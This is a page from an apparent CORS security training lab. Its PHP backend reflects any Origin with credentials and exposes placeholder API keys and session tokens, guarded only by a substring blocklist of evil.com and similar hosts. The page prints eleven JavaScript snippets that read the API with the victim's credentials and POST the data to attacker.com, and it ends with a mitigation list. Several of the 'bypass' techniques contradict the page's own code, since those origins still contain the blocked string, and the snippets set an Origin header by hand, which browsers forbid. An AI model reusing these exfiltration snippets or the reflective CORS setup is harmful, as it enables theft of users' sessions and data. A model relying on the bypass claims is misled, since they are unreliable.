<?php
// Lab 4: Advanced CORS Bypass
// Vulnerability: Advanced CORS bypass techniques

session_start();

$message = '';
$cors_headers = [];

// Simulate advanced CORS bypass
function set_cors_headers() {
    // Vulnerable: Advanced CORS bypass techniques
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
    
    // Vulnerable: Multiple bypass techniques
    if (strpos($origin, 'evil.com') !== false || 
        strpos($origin, 'attacker.com') !== false ||
        strpos($origin, 'malicious.com') !== false) {
        // Block known malicious domains
        header("HTTP/1.1 403 Forbidden");
        exit();
    }
    
    // Vulnerable: Accept any origin with various bypasses
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header, X-Forwarded-For, X-Real-IP");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Sensitive-Data, X-API-Key, X-User-Info, X-Admin-Key, X-Session-Token");
    header("Access-Control-Max-Age: 86400");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}

// Set CORS headers
set_cors_headers();

// Simulate advanced API endpoint
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];
    
    switch ($action) {
        case 'bypass_test':
            $bypass_data = [
                'origin' => $_SERVER['HTTP_ORIGIN'] ?? 'unknown',
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
                'x_forwarded_for' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'unknown',
                'x_real_ip' => $_SERVER['HTTP_X_REAL_IP'] ?? 'unknown',
                'referer' => $_SERVER['HTTP_REFERER'] ?? 'unknown',
                'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
                'bypass_techniques' => [
                    'subdomain_bypass' => 'evil.example.com',
                    'port_bypass' => 'evil.com:8080',
                    'protocol_bypass' => 'https://evil.com',
                    'path_bypass' => 'evil.com/path',
                    'fragment_bypass' => 'evil.com#fragment',
                    'query_bypass' => 'evil.com?query=value',
                    'unicode_bypass' => 'evil.com\u0000',
                    'null_byte_bypass' => 'evil.com%00',
                    'case_bypass' => 'EVIL.COM',
                    'mixed_case_bypass' => 'EvIl.CoM'
                ]
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: bypass_api_key_12345');
            header('X-User-Info: bypass_user');
            header('X-Admin-Key: bypass_admin_key_67890');
            header('X-Session-Token: bypass_session_token_99999');
            echo json_encode($bypass_data);
            exit();
            
        case 'subdomain_bypass':
            $subdomain_data = [
                'subdomain_bypass' => 'successful',
                'technique' => 'subdomain bypass',
                'original_domain' => 'example.com',
                'bypass_domain' => 'evil.example.com',
                'vulnerability' => 'subdomain wildcard CORS',
                'impact' => 'high',
                'data_exposed' => [
                    'user_data' => 'sensitive user information',
                    'api_keys' => 'API keys and tokens',
                    'session_data' => 'session information',
                    'admin_data' => 'admin panel data'
                ]
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: subdomain_bypass_key_12345');
            echo json_encode($subdomain_data);
            exit();
            
        case 'port_bypass':
            $port_data = [
                'port_bypass' => 'successful',
                'technique' => 'port bypass',
                'original_domain' => 'example.com',
                'bypass_domain' => 'evil.com:8080',
                'vulnerability' => 'port-based CORS bypass',
                'impact' => 'high',
                'data_exposed' => [
                    'port_data' => 'port-specific data',
                    'service_data' => 'service information',
                    'network_data' => 'network configuration'
                ]
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: port_bypass_key_67890');
            echo json_encode($port_data);
            exit();
            
        case 'protocol_bypass':
            $protocol_data = [
                'protocol_bypass' => 'successful',
                'technique' => 'protocol bypass',
                'original_domain' => 'http://example.com',
                'bypass_domain' => 'https://evil.com',
                'vulnerability' => 'protocol-based CORS bypass',
                'impact' => 'high',
                'data_exposed' => [
                    'protocol_data' => 'protocol-specific data',
                    'ssl_data' => 'SSL/TLS information',
                    'security_data' => 'security configuration'
                ]
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: protocol_bypass_key_99999');
            echo json_encode($protocol_data);
            exit();
    }
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (isset($input['action'])) {
        switch ($input['action']) {
            case 'bypass_test':
                $message = '<div class="alert alert-success">Bypass test executed successfully!</div>';
                break;
            case 'subdomain_bypass':
                $message = '<div class="alert alert-success">Subdomain bypass executed!</div>';
                break;
            case 'port_bypass':
                $message = '<div class="alert alert-success">Port bypass executed!</div>';
                break;
            case 'protocol_bypass':
                $message = '<div class="alert alert-success">Protocol bypass executed!</div>';
                break;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Advanced CORS Bypass - CORS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .api-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .bypass-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CORS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Advanced CORS Bypass</h1>
            <p class="hero-subtitle">Advanced CORS bypass techniques against sophisticated filters</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced CORS bypass techniques that can be used to circumvent sophisticated CORS protections. These techniques include subdomain bypass, port bypass, protocol bypass, and various encoding techniques.</p>
            <p><strong>Objective:</strong> Use advanced techniques to bypass CORS protections and access sensitive data.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable CORS Headers
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Advanced CORS bypass techniques
function set_cors_headers() {
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
    
    // Vulnerable: Multiple bypass techniques
    if (strpos($origin, 'evil.com') !== false || 
        strpos($origin, 'attacker.com') !== false ||
        strpos($origin, 'malicious.com') !== false) {
        // Block known malicious domains
        header("HTTP/1.1 403 Forbidden");
        exit();
    }
    
    // Vulnerable: Accept any origin with various bypasses
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header, X-Forwarded-For, X-Real-IP");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Sensitive-Data, X-API-Key, X-User-Info, X-Admin-Key, X-Session-Token");
    header("Access-Control-Max-Age: 86400");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Advanced CORS Bypass Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="bypass-warning">
                            <h5>⚠️ Advanced Bypass Warning</h5>
                            <p>This lab demonstrates advanced CORS bypass techniques:</p>
                            <ul>
                                <li><code>Subdomain Bypass</code> - evil.example.com</li>
                                <li><code>Port Bypass</code> - evil.com:8080</li>
                                <li><code>Protocol Bypass</code> - https://evil.com</li>
                                <li><code>Encoding Bypass</code> - Unicode, null bytes</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Bypass API Endpoints</h5>
                            <p>Try these bypass endpoints:</p>
                            <ul>
                                <li><code>?action=bypass_test</code> - General bypass test</li>
                                <li><code>?action=subdomain_bypass</code> - Subdomain bypass</li>
                                <li><code>?action=port_bypass</code> - Port bypass</li>
                                <li><code>?action=protocol_bypass</code> - Protocol bypass</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testAdvancedBypass('bypass_test')" class="btn btn-primary me-2">Test General Bypass</button>
                            <button onclick="testAdvancedBypass('subdomain_bypass')" class="btn btn-primary me-2">Test Subdomain Bypass</button>
                            <button onclick="testAdvancedBypass('port_bypass')" class="btn btn-primary me-2">Test Port Bypass</button>
                            <button onclick="testAdvancedBypass('protocol_bypass')" class="btn btn-primary">Test Protocol Bypass</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>API Response
                    </div>
                    <div class="card-body">
                        <div class="api-display">
                            <h5>API Response (May contain bypass information):</h5>
                            <div id="api-response">Click a button above to test the API</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced CORS Bypass</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> GET/POST</li>
                        <li><strong>Issue:</strong> Advanced bypass techniques</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Bypass Techniques</h5>
                    <ul>
                        <li><strong>Subdomain Bypass:</strong> evil.example.com</li>
                        <li><strong>Port Bypass:</strong> evil.com:8080</li>
                        <li><strong>Protocol Bypass:</strong> https://evil.com</li>
                        <li><strong>Encoding Bypass:</strong> Unicode, null bytes</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced CORS Bypass Examples</h5>
            <p>Use these techniques to bypass CORS protections:</p>
            
            <h6>1. Subdomain Bypass:</h6>
            <div class="code-block">// Subdomain bypass technique
fetch('http://vulnerable-site.com/api?action=subdomain_bypass', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.example.com',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Subdomain bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-subdomain', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>2. Port Bypass:</h6>
            <div class="code-block">// Port bypass technique
fetch('http://vulnerable-site.com/api?action=port_bypass', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.com:8080',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Port bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-port', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>3. Protocol Bypass:</h6>
            <div class="code-block">// Protocol bypass technique
fetch('http://vulnerable-site.com/api?action=protocol_bypass', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.com',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Protocol bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-protocol', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>4. Unicode Bypass:</h6>
            <div class="code-block">// Unicode bypass technique
fetch('http://vulnerable-site.com/api?action=bypass_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.com\u0000',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Unicode bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-unicode', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>5. Null Byte Bypass:</h6>
            <div class="code-block">// Null byte bypass technique
fetch('http://vulnerable-site.com/api?action=bypass_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.com%00',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Null byte bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-null', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>6. Case Bypass:</h6>
            <div class="code-block">// Case bypass technique
fetch('http://vulnerable-site.com/api?action=bypass_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://EVIL.COM',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Case bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-case', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>7. Mixed Case Bypass:</h6>
            <div class="code-block">// Mixed case bypass technique
fetch('http://vulnerable-site.com/api?action=bypass_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://EvIl.CoM',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Mixed case bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-mixed', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>8. Path Bypass:</h6>
            <div class="code-block">// Path bypass technique
fetch('http://vulnerable-site.com/api?action=bypass_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.com/path',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Path bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-path', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>9. Fragment Bypass:</h6>
            <div class="code-block">// Fragment bypass technique
fetch('http://vulnerable-site.com/api?action=bypass_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.com#fragment',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Fragment bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-fragment', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>10. Query Bypass:</h6>
            <div class="code-block">// Query bypass technique
fetch('http://vulnerable-site.com/api?action=bypass_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.com?query=value',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Query bypass successful:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-query', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>11. Advanced Bypass Combination:</h6>
            <div class="code-block">// Advanced bypass combination
async function advancedBypass() {
    const bypassTechniques = [
        'https://evil.example.com',
        'https://evil.com:8080',
        'https://evil.com',
        'https://evil.com\u0000',
        'https://evil.com%00',
        'https://EVIL.COM',
        'https://EvIl.CoM',
        'https://evil.com/path',
        'https://evil.com#fragment',
        'https://evil.com?query=value'
    ];
    
    for (const technique of bypassTechniques) {
        try {
            const response = await fetch('http://vulnerable-site.com/api?action=bypass_test', {
                method: 'GET',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': technique,
                    'X-Custom-Header': 'malicious-value'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log(`Bypass successful with ${technique}:`, data);
                
                // Send to attacker server
                fetch('http://attacker.com/steal-advanced', {
                    method: 'POST',
                    body: JSON.stringify({
                        technique: technique,
                        data: data,
                        timestamp: new Date().toISOString()
                    })
                });
            }
        } catch (error) {
            console.error(`Bypass failed with ${technique}:`, error);
        }
    }
}

advancedBypass();</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass sophisticated CORS protections</li>
                <li>Access sensitive data from unauthorized origins</li>
                <li>Perform unauthorized actions on behalf of users</li>
                <li>Steal credentials and session data</li>
                <li>Compliance violations and security breaches</li>
                <li>Advanced persistent threats (APT)</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement strict origin validation</li>
                    <li>Use whitelist-based CORS policies</li>
                    <li>Validate all origin headers properly</li>
                    <li>Implement proper encoding validation</li>
                    <li>Use Content Security Policy (CSP)</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual cross-origin requests</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use Web Application Firewall (WAF)</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Audit exposed headers and minimize exposure</li>
                    <li>Use secure session management</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testAdvancedBypass(action) {
            fetch(`?action=${action}`, {
                method: 'GET',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://evil.example.com',
                    'X-Custom-Header': 'malicious-value'
                }
            })
            .then(response => {
                // Access exposed headers
                const sensitiveData = response.headers.get('X-Sensitive-Data');
                const apiKey = response.headers.get('X-API-Key');
                const userInfo = response.headers.get('X-User-Info');
                const adminKey = response.headers.get('X-Admin-Key');
                const sessionToken = response.headers.get('X-Session-Token');
                
                let headerInfo = '';
                if (sensitiveData) headerInfo += `<div class="alert alert-warning">X-Sensitive-Data: ${sensitiveData}</div>`;
                if (apiKey) headerInfo += `<div class="alert alert-warning">X-API-Key: ${apiKey}</div>`;
                if (userInfo) headerInfo += `<div class="alert alert-warning">X-User-Info: ${userInfo}</div>`;
                if (adminKey) headerInfo += `<div class="alert alert-warning">X-Admin-Key: ${adminKey}</div>`;
                if (sessionToken) headerInfo += `<div class="alert alert-warning">X-Session-Token: ${sessionToken}</div>`;
                
                return response.json().then(data => ({
                    data: data,
                    headers: headerInfo
                }));
            })
            .then(result => {
                document.getElementById('api-response').innerHTML = 
                    result.headers + 
                    '<pre>' + JSON.stringify(result.data, null, 2) + '</pre>';
            })
            .catch(error => {
                document.getElementById('api-response').innerHTML = '<div class="alert alert-danger">Error: ' + error.message + '</div>';
            });
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
